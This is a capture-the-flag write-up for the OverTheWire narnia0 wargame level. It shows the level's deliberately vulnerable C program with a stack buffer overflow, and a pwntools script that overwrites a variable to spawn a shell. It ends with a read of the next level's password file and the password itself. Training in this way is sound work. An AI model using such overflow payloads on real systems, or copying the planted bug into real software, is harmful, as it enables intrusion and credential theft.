# [-] OverTheWire - narnia0 
```
Description:
This wargame is for the ones that want to learn basic exploitation. You can see the most
common bugs in this game and we've tried to make them easy to exploit. You'll get the
source code of each level to make it easier for you to spot the vuln and abuse it. The
difficulty of the game is somewhere between Leviathan and Behemoth, but some of the
levels could be quite tricky.
```
```c
narnia0@narnia:/narnia$ cat ./narnia0.c
#include <stdio.h>
#include <stdlib.h>
int main(){
    long val=0x41414141;
    char buf[20];
    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);
    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);
    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    return 0;
}
```

## [+] HOW 2 SOLVE
simple bof
```
low ===================================== high   
|  buf[20] char       |     val long       |
============================================
```

```python
from pwn import *
r = process("/narnia/narnia0")
shell = 'A' * 20 + '\xef\xbe\xad\xde'
s = r.recvuntil('\n')
print s
r.send(shell)
r.interactive()

$ cat /etc/narnia_pass/narnia1
efeidiedae

```


